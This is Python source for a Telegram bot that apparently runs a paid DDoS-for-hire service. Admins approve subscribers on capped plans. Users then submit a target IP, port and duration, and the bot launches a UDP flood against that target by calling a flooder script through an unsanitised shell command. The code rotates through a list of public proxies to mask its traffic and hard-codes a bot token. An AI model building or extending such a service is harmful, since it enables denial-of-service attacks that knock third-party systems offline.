import os
import telebot
import json
import requests
import logging
import time
import random
import sqlite3
import asyncio
import aiohttp
from datetime import datetime, timedelta
from subprocess import Popen
from threading import Thread
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# --- Database Setup (SQLite) ---
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    plan INTEGER,
    valid_until TEXT,
    access_count INTEGER
)
""")
conn.commit()

def get_user(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    return cursor.fetchone()

def update_user(user_id, plan, valid_until):
    cursor.execute("""
        INSERT INTO users (user_id, plan, valid_until, access_count)
        VALUES (?, ?, ?, 0)
        ON CONFLICT(user_id) DO UPDATE SET
        plan=excluded.plan,
        valid_until=excluded.valid_until
    """, (user_id, plan, valid_until))
    conn.commit()

def count_plan(plan):
    cursor.execute("SELECT COUNT(*) FROM users WHERE plan=?", (plan,))
    result = cursor.fetchone()
    return result[0] if result else 0

# --- Bot Configuration ---
TOKEN = "8653426400:AAHbsHrOwq3u9vHMiZfjrtmZqg37-_ERU"
FORWARD_CHANNEL_ID = -1003789613500
CHANNEL_ID = -1003789613500
error_channel_id = -1003789613500
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
bot = telebot.TeleBot(TOKEN)

# --- Asyncio Setup ---
loop = asyncio.new_event_loop()

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration, chat_id):
    try:
        # Call the new Python UDP flooder script
        process = await asyncio.create_subprocess_shell(
            f"python3 udp_flooder.py {target_ip} {target_port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        
        output = stdout.decode().strip() or stderr.decode().strip()
        
        if output:
            logging.info(f"UDP Flooder Output: {output}")
            # Optionally, send the output back to the user
            # bot.send_message(chat_id, f"`UDP Flooder Output:\n{output}`", parse_mode=\'Markdown\')
            
    except Exception as e:
        logging.error(f"Failed to execute UDP flooder: {e}")
        bot.send_message(chat_id, f"*Failed to execute attack command: {e}*", parse_mode=\'Markdown\')

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

# --- Proxy Management ---
def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {"https": proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=["update_proxy"])
def update_proxy_command(message):
    try:
        update_proxy()
        bot.send_message(message.chat.id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Failed to update proxy: {e}")

# --- Admin Logic ---
def is_user_admin(user_id, chat_id):
    try:
        status = bot.get_chat_member(chat_id, user_id).status
        return status in ["administrator", "creator"]
    except Exception as e:
        logging.error(f"Admin check failed: {e}")
        return False

@bot.message_handler(commands=["approve", "disapprove"])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode="Markdown")
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode="Markdown")
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == "/approve":
        if plan == 1:
            if count_plan(1) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode="Markdown")
                return
        elif plan == 2:
            if count_plan(2) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode="Markdown")
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        update_user(target_user_id, plan, valid_until)
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:
        update_user(target_user_id, 0, "")
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode="Markdown")
    bot.send_message(CHANNEL_ID, msg_text, parse_mode="Markdown")

# --- Attack Logic ---
@bot.message_handler(commands=["Attack"])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = get_user(user_id)
        if not user_data or user_data[1] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator ADMIN -: @Richyst.*", parse_mode="Markdown")
            return

        if user_data[1] == 1 and count_plan(1) > 99:
            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode="Markdown")
            return

        if user_data[1] == 2 and count_plan(2) > 499:
            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode="Markdown")
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*ABE SAHI COMMAND DALNA. Please use: /Attack target_ip target_port time*", parse_mode="Markdown")
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode="Markdown")
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, message.chat.id), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

# --- General Handlers ---
@bot.message_handler(commands=["start"])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn2 = KeyboardButton("flash")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")
    markup.add(btn2, btn6)
    bot.send_message(message.chat.id, "*Choose an option AUR AGAR BUY NHI KIYA HAI TO BUY KAR AUR ADMIN KO BOL APPROVE KARNE KO ADMIN -: @Richyst:*", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        bot.reply_to(message, "*Instant Plan selected*", parse_mode="Markdown")
    elif message.text == "flash":
        bot.reply_to(message, "*flash selected*", parse_mode="Markdown")
        attack_command(message)
    elif message.text == "Canary Download✔️":
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/flashmainchannel/50*", parse_mode="Markdown")
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = get_user(user_id)
        if user_data:
            username = message.from_user.username
            plan = user_data[1]
            valid_until = user_data[2]
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: {username}\n"
                        f"Plan: {plan}\n"
                        f"Valid Until: {valid_until}\n"
                        f"Current Time: {current_time}*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.reply_to(message, response, parse_mode="Markdown")
    elif message.text == "Help❓":
        bot.reply_to(message, "*Help selected @richyst*", parse_mode="Markdown")
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Contact admin selected ADMIN -: @richyst / @Mostbet_India_suppt *", parse_mode="Markdown")
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode="Markdown")

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        time.sleep(REQUEST_INTERVAL)
